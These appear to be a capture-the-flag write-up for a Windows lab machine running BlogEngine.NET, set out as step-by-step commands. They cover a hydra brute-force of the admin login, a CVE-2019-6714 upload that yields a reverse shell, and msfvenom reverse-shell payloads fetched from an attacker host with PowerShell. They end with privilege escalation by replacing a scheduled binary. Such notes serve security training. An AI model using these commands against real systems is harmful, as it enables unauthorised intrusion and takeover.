

RECON
nmap -A -p1-3000 10.10.208.52 

Nmap scan report for ip-10-10-208-52.eu-west-1.compute.internal (10.10.208.52)
Host is up (0.00064s latency).
Not shown: 2999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
MAC Address: 02:E8:F8:C9:6A:E3 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.002 days (since Thu Mar 14 20:24:51 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

------------------

Went to webpage and admin page

Ran hydra against the login page with the username "admin".

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.208.52 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=c%2BnDmBxuUGpM99XV2Ppr5EnLjQr9chIh2VXd9h7bU4in5oZdU6B2kknW%2Bh197bY9WFjdGJ%2Bz3KK19m%2BEBYA%2BIK30ElnaovIi2LvsU0nD7KbSogzOcQ7JHS3hDehwBxcixtAaxJdJzebt3ljw6rO8edCsy4Zfpph17k3wUasvchcPP44d&__EVENTVALIDATION=o1%2B4L2ebyy88zHga47L3T3zJ1aWeH51WdGmO%2F4BZ%2FaaIL0onzYYcTgmHvQJ73w9E9Pfl19yM8vJ9QBN8AUkJ66c174ze0MWrTe2vq2XEGS6kzU6EM08ZjYZ5tbbLEv8iILmDTj525g7UPITb1mjfp2FPnJ4qo3%2FC6jNc6yYaZQMUBq07&ctl00%24MainContent%24LoginUser%24UserName=^USER^&&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

Password = 1qaz2wsx

----------------

Found BlogMe version at Admin portal under About tab


Your BlogEngine.NET Specification

    Version: 3.3.6.0
    Configuration: Single blog
    Trust level: Unrestricted
    Identity: IIS APPPOOL\Blog
    Blog provider: XmlBlogProvider
    Membership provider: XmlMembershipProvider
    Role provider: XmlRoleProvider


Exploit db search:
CVE-2019-6714

Downloaded file and saved it as PostView.ascx

Uploaded the file via editing a post.

started a listener - nc -lvnp 4444

Triggered the vuln. by accessing the base URL for the blog with a theme override specified like so:
 http://10.10.10.10/?theme=../../App_Data/files

-> got windows shell

-------------------------------------------------------------------------------------------
NOW TO UPGRADE OUR WINDOWS 'SHELL WITH MSFVENOM!

msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LOCALIP] LPORT=9001 -f exe > reverse.exe        - CREATING THE PAYLOAD VIA MSFVENOM
-> Make sure LPORT is different from the port you used in the BlogEngine exploit. <-


COPY OVER THE REVERSE.EXE TO THE WINDOWS MACHINE
First go to a world writable location -        C:\Windows\Temp
Start up a http server on your attacking machine -      python3 -m http.server 8000
Then invoke the following PS command on your attacking machine - powershell -c "Invoke-WebRequest -Uri 'http://[ATTACKIP]:8000/reverse.exe' -OutFile 'C:\Windows\Temp\reverse.exe'"




NOW TO SETUP A METERPRETER HANDLER

msfconsole
use exploit/multi/handler
options        - set appropriate options:
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKIP]
SET LPORT 9001

run                (final command)

MOVE BACK OVER TO THE WINDOWS MACHINE

.\reverse.exe            - run the msfvenom payload

meterpreter session should be open
------------------------------------------

After we got a meterpreter session running on the Windows machine we ran the command sysinfo:
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

---->

The following write up will go back to normal shell to invoke Powershell easier:
shell                -> as in the command

Now we will clone WinPEAS onto our attacking machine to prepare to transfer it over:
git clone https://github.com/carlospolop/PEASS-ng.git

Now navigate to the directory folder containing WinPEAS.bat
Start another HTTP server in this directory
python3 -m http.server

Now return to your Windows Meterpreter Shell
powershell -c "Invoke-WebRequest -Uri 'http://10.10.189.70:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"

Take a bit longer than normal to pull it from our machine

.\winPEAS.bat

Look for RUNNING PROCESSES in the results:            (Always good idea to do this when you get access to a Windows machine)
If you are having issues reading the results in the dumb shell do the following:
.\winPEAS.bat > results.txt
And then background/terminate the 'dumb' shell and read the results in your Meterpreter shell.

We find two services that should always be looked for!!!!
WService.exe (Windows Scheduler)
and
WSchedulder.exe

We then backgrounded the 'dumb' Shell and returned to our Meterpreter shell     (either background command or ctrl+c to do so)

On our meterpreter shell we now go to:
cd C:\"Program Files (x86)"
cd SystemScheduler            (This directory is great for hacking processes)
cd Events            (system logs can often be found here)
cat 20198415519.INI.txt           (log can be very useful for finding out processes, for example ones that run every 30 seconds like in this case)

We identify a process called Message.exe that runs every 30 seconds. We can exploit this.
cd ..                - Move back to SystemScheduler dir
mv C:/Windows/Temp/reverse.exe reverse.exe            - Move your reverse.exe msfvenom payload to this directory
mv Message.exe Message.bak                            - Rename old Message.exe process to prepare for our exploiting
mv reverse.exe Message.exe

background            - background your Meterpreter Shell
run                   - run your reverse_tcp exploit in msfconsole

YOU SHOULD NOW BE SYSTEM
shell            - go back to dumb shell if you want
whoami
echo %username%


Now that we have Admin rights we search for the user.txt and root.txt flag
search -f user.txt
search -f root.txt


To see what abnormal service is running:
tasklist /SVC            - in dumb shell

------------------------------------------------------------------------------------------------------------
Privilege Escalation WITHOUT Metasploit/Meterpreter
Do everything same up until you get first shell from the Blog file upload.


msfvenom -p windows/shell_reverse_tcp LHOST=[LOCALIP] LPORT=9001 -f exe > shell.exe
nc -lvnp 9001
python3 -m http.server            - Start up a python http server

Pull it onto C:\Windows\Temp with powershell:
powershell -c "Invoke-WebRequest -Uri 'http://[LOCALIP]:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"


.\shell.exe            - you have now pivoted to a more stable shell


on upgraded shell:
nc -lvnp 9001 start another netcat listener for your upcoming root shell 

cd C:\"Program Files (x86)
cd SystemScheduler

move C:\Windows\Temp\shell.exe shell.exe
move Message.exe Message.bak
move shell.exe Message.exe

Wait for admin shell to come through on your netcat 9001 listener.











